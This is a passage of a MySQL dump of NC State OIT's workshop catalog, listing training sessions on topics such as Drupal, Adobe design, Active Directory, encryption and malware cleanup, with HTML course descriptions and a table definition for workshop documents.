(63, 'OIT Internal Staff Accessibility Training', 'Working knowledge of web pages and HTML', 'enabled', '0', '<p>The workshop will give an overview of the web accessibility guidelines and information on how to create content with Drupal to meet the guidelines</p><p>&nbsp;</p>'),
(64, 'iTunesU @ NC State', '', 'enabled', '0', 'This one hour seminar style workshop will show you everything you need to know to begin posting your podcasts to NC State''s iTunes channel.'),
(65, 'Editing the OIT Website with Drupal', '<p>Students must go to <a href="http://oit.ncsu.edu/" target="_blank">http://oit.ncsu.edu/</a> and login with their Unity ID and password (link in the lower right-hand corner) before the first class.</p><p>&nbsp;This workshop is for employees of the Office of Information Technology only. All others who sign-up for this workshop will be removed from the roster. </p>', 'enabled', '0', '<p>This class will give users a chance to create and edit test content for the Office of Information Technology website. This website is in the Drupal Content Management System.</p><p>&nbsp;More information can be found online at <a href="http://xteams.oit.ncsu.edu/oitwebsite/" target="_blank">http://xteams.oit.ncsu.edu/oitwebsite/</a>. </p>'),
(66, 'Author Once and Publish in Many Formats using MS Word', 'Working Experience with MS Word.', 'enabled', '0', 'The Workshop will help participants use MS Word learn to author content including math notation that can be easily converted into a format that is accessible and usable by all people including people with a disability.&nbsp;'),
(67, 'New Employee IT presentation', '', 'disabled', '0', ''),
(68, 'Trying to Cut Costs? Explore Transportation Alternatives', '<span class="Apple-style-span" style="font-weight: bold">OIT staff members only please.</span>', 'enabled', '0', '<div><font color="#0000ff">This workshop&nbsp;is for OIT&nbsp;staff members only!</font>&nbsp;</div><div>Presenter: Tom Karches, OIT-ISO Provisioning</div><div>&nbsp;</div><div>Are&nbsp;gas prices draining your budget?&nbsp;Are you considering alternative&nbsp;ways to get to and from work? Then consider Wolftrails, an&nbsp;NC State Transportation&nbsp;Program&nbsp;that offers a number of transportation alternatives including carpooling, vanpooling, biking, walking, ridesharing and riding the bus. Come to this information session and learn more about Wolftrails and what alternative means of transportation are available.&nbsp; There will be a representative on-hand from Transportation to answer questions. Visit Wolftrails at <a href="http://www2.acs.ncsu.edu/trans/transportation/wolftrails/">http://www2.acs.ncsu.edu/trans/transportation/wolftrails/</a>.</div><div>You''ll also meet presenter Tom Karches of OIT-ISO, who has been riding the Triangle Transit Authority (TTA) bus from Cary to NC State campus&nbsp;for the past three years, and Tom will share his experiences. Bring your questions and see if alternative transit works for you.</div>'),
(69, 'iTunesU @ NC State - Brown Bag Lunch Series', '', 'enabled', '0', '<div id="description">This one hour seminar style workshop will show you everything you need to know to begin posting your podcasts to NC State''s iTunes channel.</div>'),
(70, 'Conversation about Accessibility of Emerging Web Technology', '', 'enabled', '0', '<p>Conversation about Accessibility of Emerging Web Technology (WEB 2.0)</p><p>The demand for real-time communications, collaborations, anytime/anywheretransactions, social networks, virtual and immersive environments arerapidly changing the state of the Internet.&nbsp; The web is becoming both theinfrastructure and the platform for these services. Accessibility andusability of this space can no longer be prescriptive, but requires anunderstanding of how people with disability use the web and integratingtheir needs in the design and development of the environment.</p><p>&nbsp;</p><p>Margaret Hudacko, Mike Vysocka, Hal Meeks, Troy Hurteau and Greg Kraus haveall volunteered to share their experiences to start the conversation.&nbsp; Thisis an opportunity to share and learn about the challenges and solutions for this changing IT space. </p>'),
(71, 'Are You Ready For The DTV Revolution?', '', 'enabled', '0', '<p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">&nbsp;</span>Presenter: Dan Tucker, OIT Learning Space Technology Coordinator</p><p>We are all aware of the impending move to digital television, so we are looking at that 52&quot; TV with envy&nbsp;and all the different choices out there:&nbsp;720P, 1080i, Plasma, LCD, DLP, Projection, etc.&nbsp; Do I need to upgrade at all?&nbsp;How big a set should I get? What can I hook up to it? All this and more will be discussed to help you get ready for the DTV Revolution.</p>'),
(72, 'Your Next Camcorder', '', 'enabled', '0', '<p>Presenter: Hal Meeks, OIT New Media Consultant&nbsp;</p><p>Are you in the market for a new camcorder? If so, the good news is that prices have decreased significantly. The not so good news is that there''s a myriad of choices and what may be good for you may not suit someone else. Do you really need to buy an HD camcorder if you are&nbsp;just putting stuff on the web? Flash, Tape, Harddrive, DVD.. so many choices. We will look at some popular models and will talk about what else you might need to purchase.</p>'),
(73, 'delete', '', 'disabled', '0', ''),
(74, 'Intro to Active Directory', '', 'enabled', '0', '<p><font size="3">This will be an introduction to Active Directory.&nbsp; The target audience is technical staff who have never used it.&nbsp; We will be doing a high-level overview of:</font></p><ul><li><font size="3">What is Active Directory</font></li><li><font size="3">What it isn''t</font></li><li><font size="3">Basic Authentication/Authorization/Management concepts</font></li><li><font size="3">Demo''s of Management tools</font></li><li><font size="3">Descriptions of associated services/technologies.</font></li></ul>'),
(75, 'Active Directory: OU Administration', '<p>Familiarity with Active Directory.</p>', 'enabled', '0', '<p><font size="3">This class is targetted at IT staff who will be responsible for managment of users and computers in an Active Directory environment.&nbsp; This will include:</font></p><ul><li>Migration Workflow</li><li>Management Tools</li><li>Policies/Preferences </li><li>OU Layout </li><li>Grouping/Filtering </li><li>Permissions/Delegation</li><li>Associated Services/Technologies</li><li>Management Scenarios</li></ul>'),
(76, 'New Antivirus Client Demonstrations', '', 'enabled', '0', '<p>OIT is pleased to provide NCSU IT staff with demonstrations of the new Trend Micro OfficeScan and Intego VirusBarrier antivirus products.&nbsp; These sessions are open to all IT staff at NCSU. </p><p>Each one hour session will include:</p><ul><li>interactive demonstration and discussion of how to use the new client antivirus products</li><li>as well as some tips and tricks from our testing</li><li>discuss ways to uninstall old Symantec client programs</li></ul><p>These demonstrations are designed to be free-form, to allow campus IT staff to have their questions answered. </p>'),
(77, 'Choosing a Digital Camera', '', 'enabled', '0', '<p>Presenter: Chris Donald, OIT Outreach, Communications &amp; Consulting</p><p>&nbsp;Start time 12:15 pm, End time 12:45 pm </p><p>&nbsp;</p><p>Participants will learn how to select the right digital camera for their individual needs. They will be given a quick overview of flashes, lenses and tripods and will also learn about options for processing, storing, and printing their photos.</p>'),
(78, 'iPhone and G1 Phone Users Forum', '', 'enabled', '0', '<p><font size="2">Facilitator: Harry Nicholos, OIT: Systems &amp; Hosted Services</font></p><p><font size="2">(actual start time 12:15, end time 12:45)</font></p><p><font face="Arial" size="2">Anyone interested in Apple''s iPhone or the T-Mobile''s G1 phone can benefit from this open discussion among users about applications and features. </font></p><p><font size="2"></font></p>'),
(79, 'Windows Deployment Services 1: Introduction', 'Students are expected to have a basic knowledge of TCP/IP and experience using the Virtual Computing Laboratory (VCL). &nbsp;It would also be helpful if students have OU administration capabilities in the Wolftech domain, but it is not a necessity.', 'disabled', '0', '<p>The first in a three part series, this session will introduce students to Windows Deployment Services (WDS), the Microsoft-developed methodology for installing Windows via network.</p><p>Topics covered in this session:&nbsp;</p><ul><li>Introduction</li><li>Differences between WDS and Remote Installation Services</li><li>Differences between Windows 2003 and 2008</li><li>Installation</li><li>Authorization</li><li>Configuration</li><li>Management</li><li>Legacy, Hybrid, and Native operating modes</li></ul><p>This session will NOT focus on image management (.wim files) or automated Windows installations - these topics will be covered in future sessions.</p><p>Information presented in this workshop will be tailored to the Wolftech Active Directory domain, but can be easily generalized to other Active Directory installations.&nbsp;</p>'),
(80, 'Windows Deployment Services 2: Image Management', 'Students are expected to have a basic knowledge of&nbsp;Windows Deployment&nbsp;Services (<a href="/?workshopId=79">as covered in the first session</a>)&nbsp;and experience using the Virtual Computing Laboratory (VCL). &nbsp;It would also be helpful if students have OU administration capabilities in the Wolftech domain, but it is not a necessity.', 'disabled', '0', '<p>The second in a three part series, this session will guide students through the management of Windows images (.wim files) in relation to a&nbsp;Windows Deployment Services (WDS) infrastructure.</p><p>Topics covered in this session:&nbsp;</p><ul><li>Introduction to images </li><li>Image&nbsp;contents</li><li>Where to locate images</li><li>Types of images: boot, capture, discover, install and data</li><li>Offline image maintenance</li><li>Updating drivers within an image</li><li>Creating capture and discover images</li><li>Capturing an image</li></ul><p>This session will NOT focus on&nbsp;automated Windows installations - this topic will be covered in a future session.</p><p>Information presented in this workshop will be tailored to the Wolftech Active Directory domain, but can be easily generalized to other Active Directory installations.</p>'),
(81, 'Windows Deployment Services 3: Automated Installations', '<span class="Apple-style-span" style="font-family: Times; font-size: 16px"><div style="font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; background-color: #ffffff">Students are expected to have a basic knowledge of&nbsp;Windows Deployment&nbsp;Services (<a href="../../../../?workshopId=79">as covered in the first session</a>)&nbsp;and experience using the Virtual Computing Laboratory (VCL). &nbsp;It would also be helpful if students have OU administration capabilities in the Wolftech domain, but it is not a necessity.</div></span>', 'disabled', '0', '<span class="Apple-style-span" style="color: #3f3f3f; font-family: Arial; font-size: 12px; line-height: 17px"><div id="description" style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 12px"><p style="margin-top: 0px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px">The the last in this three part series, this session will guide students through the methodologies available for automated deployments of Windows when used in conjunction with Windows Deployment Services.</p><p style="margin-top: 0px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px">Topics covered in this session:&nbsp;</p><ul><li>Windows installation stages</li><li>Automating the boot image</li><li>Automating the install image</li><li>Unattend.xml and ImageUnattend.xml</li><li>Using Windows System Image Manager</li><li>Creating automated installation answer files</li><li>Automating Windows XP installations with WDS Native Mode</li></ul><p style="margin-top: 0px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px">Information presented in this workshop will be tailored to the Wolftech Active Directory domain, but can be easily generalized to other Active Directory installations.</p></div></span>'),
(82, 'The Glitter of Twitter', '', 'enabled', '0', '<span style="font-size: 10pt; font-family: Arial">Twitter is a free social networking blogging service that allows users to send &ldquo;tweets&rdquo; or updates to each other. </span><strong><span style="font-weight: normal; font-size: 10pt; color: black; font-family: Arial">John Martin of OIT Information and News Services will talk about: Twitter in plain English, the five stages of Twitter acceptance, uses of Twitter in general as well as in the workplace, and look at some Twitter clients and tools. Feel free to bring an Internet-connected laptop, PDA, or smartphone to the session to sign up for Twitter and to follow the twitter dialog in the room!</span></strong>'),
(83, 'Quickstart Guide to Facebook for New Users', '', 'enabled', '0', 'Facebook is a free social networking Web site that allows people to interact and  share information. During this session, Twanda Baker of OIT Design, Education,  and Outreach will show participants how to set up their Facebook profile,  connect with co-workers and friends, protect their privacy, navigate around  pages, and how to communicate using the Facebook Wall and Inbox'),
(84, 'Adobe Series: Collages & Photography', '', 'enabled', '0', '<p><span class="Apple-style-span" style="font-size: 16px"><span class="Apple-style-span" style="font-weight: bold">Objective:</span></span></p><p><span class="Apple-style-span" style="font-size: 16px"><span class="Apple-style-span" style="font-weight: bold"></span>To produce quality images for print, web, or video, students need to understand essential graphic design principles and how digital images are created.</span></p><p><font size="3">Adobe Photoshop CS3 Extended is an image-manipulation tool that can help students analyze, enhance, and edit images. </font></p><p><font size="3">In this class, students learn the basics of photography, image composition, and elements of visual design as they create a collage. Students use photos from various sources, identifying elements of visual design that reflect good composition. They use Photoshop to retouch and manipulate these photos and images to build a collage. Through this process, they learn about copyright issues and document their learning by using Adobe Acrobat 8 Professional.</font></p><p><font size="3"><strong>Photoshop</strong></font></p><p><font size="3">Understanding the Adobe Photoshop CS3Extended interface</font></p><p><font size="3">Importing and working with various file formats</font></p><p><font size="3">Working with layers</font></p><p><font size="3">Retouching photos by using selection toolsAdjusting brightness and contrast</font></p><p><font size="3">Adjusting levels and colors</font></p><p><font size="3">Cropping, resizing, and straightening images</font></p><p><font size="3">Using Photomerge</font></p><p><font size="3">Transforming images</font></p><p>&nbsp;</p><p><font size="3"><strong>Acrobat</strong></font></p><p><font size="3">Creating PDFs. </font></p>'),
(85, 'Adobe Series: Greeting Cards 1', '', 'enabled', '0', '<p>&nbsp;<font size="3">*Important*</font></p><p><font size="3">This is a two part workshop. March 23 and March 30 from 1:30 - 4:30pm. Once you are attend Part 1,&nbsp; our training coordinator will register you for the second workshop. Please make sure you are available to attend <em>both</em> workshops.</font></p><p>************************************************************************* </p><p style="margin: 0px 0px 6px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 12px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px; font-weight: bold"><span class="Apple-style-span" style="font-family: Verdana; font-size: 10px; font-weight: normal"><p style="margin: 0px 0px 6px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 12px; line-height: normal; font-size-adjust: none; font-stretch: normal">&nbsp;</p><p style="margin: 0px 0px 6px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 12px; line-height: normal; font-size-adjust: none; font-stretch: normal"><strong><span class="Apple-style-span" style="font-size: 16px">Project overview</span></strong></p><p style="margin: 0px 0px 10px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">In this project, students can create a greeting card, and in the process, they learn about typography and layout design. Students also investigate how tone, audience, and purpose impact design decisions.&nbsp;</span></p><p style="margin: 0px 0px 10px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span style="font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 12px; line-height: normal; font-size-adjust: none; font-stretch: normal"><strong><span class="Apple-style-span" style="font-size: 16px">Student product:</span></strong><span class="Apple-style-span" style="font-size: 16px">&nbsp;</span></span><span class="Apple-style-span" style="font-size: 16px">Greeting card and PDF slideshow presentation</span></p><p style="margin: 0px 0px 6px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 12px; line-height: normal; font-size-adjust: none; font-stretch: normal"><strong><span class="Apple-style-span" style="font-size: 16px">Project objectives</span></strong></p><p style="margin: 0px 0px 10px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">At the completion of the project, students will have developed the following skills.</span></p><p style="margin: 0px 0px 3px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px"><span class="Apple-style-span" style="font-weight: bold">Photoshop</span></span></p><p style="margin: 0px 0px 3px 36px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Exporting to InDesign</span></p><p style="margin: 0px 0px 3px 36px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Applying filters, such as the Lighting Effect or</span></p><p style="margin: 0px 0px 3px 36px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Lens Flare</span></p><p style="margin: 0px 0px 3px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px"><span class="Apple-style-span" style="font-weight: bold">InDesign</span></span></p><p style="margin: 0px 0px 3px 36px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Understanding the InDesign interface</span></p><p style="margin: 0px 0px 3px 36px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Setting document properties, including dimensions and margins</span></p><p style="margin: 0px 0px 3px 36px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Adding and modifying text</span></p><p style="margin: 0px 0px 6px 36px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Using alignment tools, ruler, and grid</span></p><p style="margin: 0px 0px 3px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px"><span class="Apple-style-span" style="font-weight: bold">Acrobat</span></span></p><p style="margin: 0px 0px 10px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; line-height: normal; font-size-adjust: none; font-stretch: normal"><span class="Apple-style-span" style="font-size: 16px">Creating PDF slideshows&nbsp;</span></p></span></span></p>'),
(86, 'Adobe Series: Greeting Cards 2', '<p>Must attend the<a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=85"> Adobe Series: Greeting Cards 1</a> workshop.</p><p><a href="../../../..//?workshopId=85"></a></p><p><span class="Apple-style-span" style="color: #551a8b; text-decoration: underline"></span></p><p>&nbsp;</p>', 'enabled', '0', '<font size="3">This is the second part of the <a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=85">Greeting Cards</a> workshop. Only those registered for <a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=85">part 1</a> will be enrolled into this workshop.</font>');
INSERT INTO `oit_tbl_workshop` (`workshopId`, `title`, `prerequisites`, `status`, `featured`, `description`) VALUES
(87, 'Adobe Series: Advertisements 1', '<font size="3">Must have taken the Greeting Card or Collages Adobe workshop <em>or</em> have equivelent experience with any version of the creative suite. Specifically, students must be familiar with the Adobe Tool Palette.</font>', 'enabled', '0', '<p>&nbsp;<font size="3">*Important*</font></p><p><font size="3">This is a two part workshop. April 6 and April 13 from 1:30 - 4:30pm. When you register for this workshop our training coordinator will register you for the second workshop. Please make sure you are available to attend both workshops.</font></p><p>************************************************************************* </p><p><font size="3"><strong>Project overview</strong></font></p><p><font size="3">Often we need to create small ads for newsletters or as a way of promoting an upcoming event or our services. In this project, students are introduced to the process of working on an advertisement project. They work to identify the goals, audience, and purpose of the advertisement.Working in small groups, students interview clients and then design and provide multiple comps of their advertisement designs to the client. Students engage in a review and redesign cycle with their clients. They also conduct a focus group to gain feedback on the usability and overall effect of their advertisements. Students engage in the review and redesign process until reaching agreement with clients. Students build their client advertisements for placement in print, web, and video collateral. Finally students reflect on their overall process and product.</font></p><p><font size="3"><strong>Photoshop</strong></font></p><p><font size="3">Editing photographsCreating design compsCreating reusable assetsUsing opacity and fill toolsSaving as PDF</font></p><p><font size="3"><strong>InDesign</strong></font></p><p><font size="3">Exporting to different formatsFormatting text (kerning, tracking, scaling, and so on)Combining graphic and text frames to make page layoutsUsing InDesign layersPlacing objects (images, text, PSD files) on the pagePlacing text over imagesUsing graphic frames as masks</font></p><p><font size="3"><strong>Acrobat</strong></font></p><font size="3">Creating a PDF</font><p>&nbsp;</p>'),
(88, 'Adobe Series: Advertisements  2', '<font size="3"><a href="../details/?workshopId=87">Advertisement 1</a></font>', 'enabled', '0', '<font size="3">This is the second part of the <a href="../details/?workshopId=87">Advertisement </a>workshop. Only those registered for <a href="../details/?workshopId=87">part 1</a> will be enrolled into this workshop.</font>'),
(89, 'Adobe Series: Brochures  1', '<strong><font size="3">Registrants must have attended the Advertisements workshop.</font></strong>&nbsp; <font size="2">If are interested in this workshop and you have experience with InDesign and PhotoShop but have not taken the Advertisement workshops please contact classreg@ncsu.edu. Thank you.</font>', 'enabled', '1', '<p>&nbsp;<font size="3">*Important*</font></p><p><font size="3">This is a two part workshop. April 30 and May 7 from 9:00am - 12:00pm. When you register for this workshop our training coordinator will register you for the second workshop. Please make sure you are available to attend both workshops.</font></p><p>************************************************************************* </p><p>&nbsp;</p><p><font size="3"><strong>Project overview</strong></font></p><p><font size="3">Brochures can be found everywhere, describing tourist destinations, providing information about services, or giving an overview of an organization. A brochure is a paper collateral that informs people about a product, service, or location. Informing with a brochure can be quick and cost-effective. Students will further enhance their design and technical skills by creating a brochure, using advanced image manipulation techniques and page layout design.At the completion of the project, students will have developed the following skills:</font></p><p><font size="3"><strong>Photoshop</strong>&nbsp; </font></p><ul><li><font size="3">Using color management tools&nbsp; </font></li><li><font size="3">Using filters&nbsp; </font></li><li><font size="3">Using blending tools&nbsp; </font></li><li><font size="3">Transforming images&nbsp; </font></li><li><font size="3">Retouching images</font></li></ul><p><font size="3"><strong>InDesign</strong>&nbsp; </font></p><ul><li><font size="3">Understanding InDesign frames&nbsp; </font></li><li><font size="3">Using placeholder text&nbsp; </font></li><li><font size="3">Designing in columns&nbsp; </font></li><li><font size="3">Using character and paragraph styles&nbsp; </font></li><li><font size="3">Wrapping text around objects (including using anchors)&nbsp; </font></li><li><font size="3">Applying effects to text&nbsp; </font></li><li><font size="3">Placing objects on page&nbsp; </font></li><li><font size="3">Creating shapes and borders</font></li></ul><p><font size="3"><strong>Acrobat</strong>&nbsp; </font></p><ul><li><font size="3">Using commenting tools</font></li></ul><p>&nbsp;</p>'),
(90, 'Adobe Series: Brochures  2', '<a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=89">Adobe Series: Brochure 1</a>', 'enabled', '1', '<font size="3">This is the second part of the <a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=89">Brochure</a> workshop. Only those registered for <a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=89">part 1</a> will be enrolled into this workshop.</font>'),
(91, 'Practical Encryption', '', 'enabled', '0', '<p>&nbsp;Instructor: Tim Gurganus, OIT, Security &amp; Compliance </p><p><font face="Arial">You will see&nbsp;demonstrations of encryption applications like TrueCrypt, Gnu4Win, McAfee Endpoint Encryption, OpenPGP, FileVault, BitLocker, and Microsoft EFS to show&nbsp;practical ways to protect data from theft, accidental loss and eavesdropping. </font></p><div><font face="Arial">In addition, you will also learn&nbsp;specifically how to work with encryption keys and passwords; encrypt data on your laptop, hard drive, CDs, DVDs, USB drives, iPhone, Smartphone,&nbsp;and Blackberry; backup and restore encrypted data; and how to securely delete files so data can''t be recovered.</font></div>'),
(92, 'Twitter: Basic Use and Professional Use', '', 'enabled', '0', '<p>Instructor:&nbsp; John Martin, OIT''s Outreach, Communication &amp; Consulting</p><p>This session will include how to sign up for Twitter, what &quot;Following&quot; and&nbsp;&quot;Followers&quot; are all about, how to direct tweets, and how to send private tweets. We''ll also take a quick look at a few twitter tools,&nbsp;such as&nbsp;TweetGrid, TweetDeck, and Digsby.&nbsp;And finally, we''ll look at ways Twitter is being used in the professional world, including a look at how some Office of Information Technology (OIT) staff are using it. Feel free to bring your own laptop or Internet-accessible PDA to sign up and/or become Followers of each other on the spot.</p>'),
(93, 'Trend Micro - client management', '', 'enabled', '0', '[Enter description here]'),
(94, 'iPhone Development Workshop', '<ul><li>Some knowledge of software development</li><li>An understanding of Object-Oriented Programming</li></ul>', 'enabled', '0', '<p>Are you an iPhone user?&nbsp; Have you ever downloaded an app from the Apple App Store and thought, &quot;I wish I could write something like that&quot;.&nbsp; Well, here is your chance to give it a shot!&nbsp; Come out and hear Steve Hayman, CE of Apple Mobility, give a hands-on workshop for developing apps for the iPhone.&nbsp; Also present will be our campus Apple rep, to answer any questions about how to get started with iPhone development. </p><p><img src="http://www.mp4converter.net/images/upload/iphone_home.gif" border="0" alt="iPhone" width="300" height="495" align="middle" /></p>'),
(95, 'Delete this workshop!', '', 'disabled', '0', ''),
(96, 'What''s New in Access 2007?', 'Current Access users only please. New Access users should attend our Introduction to Access workshop.', 'enabled', '0', 'This workshop is designed to get currect Access users up to speed on the new look and features in Access 2007.'),
(97, 'Trend Micro - client and group management', 'Be in a role where you need to manage on-campus Trend Micro Officescan clients.', 'enabled', '1', '<p><strong><font size="3">Trend Micro Client and Group Management for campus IT Administrators</font></strong></p><p>&nbsp;This workshop is for campus IT administrators who want to administer Trend Micro OfficeScan clients running on PCs under their management.<span>&nbsp; </span>Components that will be covered:</p>  <ul><li>Overview of the Trend Micro Control Manager dashboard</li><li>Grouping clients</li><li>Report generation</li><li>Creation of scan exceptions</li><li>Modifications to scan policies</li><li>Questions and Answers</li></ul><p>            &nbsp;</p><p><font size="3">&nbsp;</font></p><p>&nbsp;</p>'),
(98, 'Dealing with Modern Malware', '', 'enabled', '1', 'Modern malware includes programs such as the storm worm, the Conficker and Waledac viruses, IRCBots and rootkits. This lunch and learn is for support personnel in OIT, and around campus, who are responsible for addressing computers infected with such malware. Tim Gurganus, of OIT Security, will share some methods, guidelines and warnings about what to do in these situations. Some of the information will come from his experience with viruses and analysis of modern malware. He''ll also give a demo of some tools and commands to use to determine whether a computer is still infected or now clean.'),
(99, 'Creating Groups & Events in Facebook', '', 'enabled', '1', '<div>This presentation is&nbsp;for Facebook users, and we''ll&nbsp;look at&nbsp;the what, why,  and how-to of&nbsp;two very popular Facebook online collaborative tools:&nbsp;Groups and  Events.&nbsp;<em>Facebook Groups</em> provide a space for&nbsp;members who share common  interests to post discussion issues, pictures, and videos. <em>Facebook  Events</em> is a social-planning tool for creating, sending, and managing online  invitations to Facebook and non-Facebook members. This class will not cover the  basics of getting started on Facebook.</div>'),
(100, 'Why Macs in Science? with Warner Yuen', '', 'enabled', '1', '<p>You&rsquo;re invited to a free seminar exploring Apple&rsquo;s solutions for scientific computing.&nbsp; The Mac&rsquo;s ease of use, stability and superior performance help scientists achieve faster, more insightful results.Find out how the Mac integrates with other platforms, what other scientists have accomplished with their Macs and why the Mac isthe ideal platform for scientific research and day- to-day activities.</p><p><span class="Apple-style-span" style="font-weight: bold">Presenter</span> - Warner Yuen is a Scientific Computing Consulting Engineer at Apple specializing in science and high performance computing solutions. He has been the technical lead for many of Apple''s HPC installations.</p><p>&bull; Science and productivity applications on the Mac</p><p>&bull; Running multiple operating systems (Mac OS X, Windows and Linux)</p><p>&bull; Podcasting your science</p><p>&bull; Collaboration services</p><p>&bull; Leveraging iPhone and iPod Touch for mobile science applications</p><p>&bull; Compute in any language:&nbsp; C/C  , Fortran, Java, Perl, Python</p><p>&bull; Implementing High Performance Computing and 64-bit multicore computing</p><p><span class="Apple-style-span" style="font-weight: bold">Who should attend</span> - Research and teaching faculty, deans and department chairs, researchers, distance learning providers, lab managers, medical and scientific professionals, and prospective Mac users.</p>'),
(101, 'delete this', '', 'enabled', '0', '<p>&nbsp;</p><p>&nbsp;</p>'),
(102, 'WolfWise Demonstrations for Campus (Mac/Linux)', '', 'enabled', '1', '<p><font size="2">This is a&nbsp;1 hour instructor-led demonstration of the basic features of WolfWise email and calendaring. A 30 minute question and answer session will follow the presentation.</font></p><p><font size="2">This session is specifically geared to those using the Linux or Mac operating systems, though anyone is welcome to attend. </font></p><p><font size="2">Demos have also been scheduled for <a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=103">Windows users</a>.</font></p><p>&nbsp;</p><p>&nbsp;</p>'),
(103, 'WolfWise Demonstrations for Campus (Windows)', '', 'enabled', '1', '<p><font size="2">This is a&nbsp;1 hour instructor-led demonstration of the basic features of WolfWise email and calendaring. A 30 minute question and answer session will follow the presentation.</font></p><p><font size="2">This session is specifically geared to those using the Windows operating system, though anyone is welcome to attend.</font></p><p><font size="2">Demos have also been scheduled for <a href="webapps.ncsu.edu/classmate/workshop/index/details/?workshopId=102">Linux/Mac Users</a>.&nbsp;</font>&nbsp;&nbsp;</p>'),
(104, 'Hands- On WolfWise workshop for Campus  (Windows)', '', 'enabled', '1', '<p>This 3 hour hands-on training session will be held at the Computer Training Unit using the Windows operating system.&nbsp; The workshop will cover the basic functionality of the WolfWise email and calendar system including:</p><ul><li>Exploring the GroupWise environment </li><li>Working with mail&nbsp; </li><li>Managing the Mailbox</li><li>Managing address books</li><li>Working with the calendar</li><li>Using Tasks</li><li>Creating Rules</li><li>Proxy Access</li><li>Tasks</li></ul><p>&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;</p>'),
(105, 'IT Staff Training on Wolfwise Mobile Suppport', 'Attendees should be IT support staff.', 'enabled', '1', 'This training is intended for IT support staff.'),
(106, 'IT Staff Training on Oracle to WolfWise Migration Support', 'Attendees should be IT support staff.', 'enabled', '1', 'This workshop is intended for IT support staff.'),
(107, 'IAM Overview & Roadmap for NC State', '', 'enabled', '1', 'Mark Sheible, of OIT Security &amp; Compliance, will talk about how  the&nbsp;components that make up an IAM system work together, including examples of  how Identities, Authentication, Authorization, Group Management, and Federation  all fit into the big picture.&nbsp; Find out what IAM projects are taking place, and  what&rsquo;s being proposed to provide IAM solutions for the university.&nbsp; A Q&amp;A  period will follow the presentation.');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_workshop_document`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_workshop_document` (
  `workshopDocumentId` int(11) NOT NULL AUTO_INCREMENT,
  `workshopId` int(10) unsigned NOT NULL DEFAULT '0',
  `name` varchar(64) NOT NULL DEFAULT '',
  `description` mediumtext NOT NULL,
  `type` varchar(255) NOT NULL DEFAULT '',
  `uploadDt` int(10) unsigned NOT NULL DEFAULT '0',
  `filesize` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`workshopDocumentId`),
  KEY `workshopId` (`workshopId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=254 ;

--
-- Dumping data for table `oit_tbl_workshop_document`
--

INSERT INTO `oit_tbl_workshop_document` (`workshopDocumentId`, `workshopId`, `name`, `description`, `type`, `uploadDt`, `filesize`) VALUES
(213, 38, 'OOP_with_PHP5.pdf', 'application/pdf', 'pdf', 1211378645, 8527096),
(214, 39, 'Design Patterns.pdf', 'application/pdf', 'pdf', 1209654176, 13424175),
(215, 40, 'bar.jpg', 'image/jpeg', 'image', 1207853333, 8248),
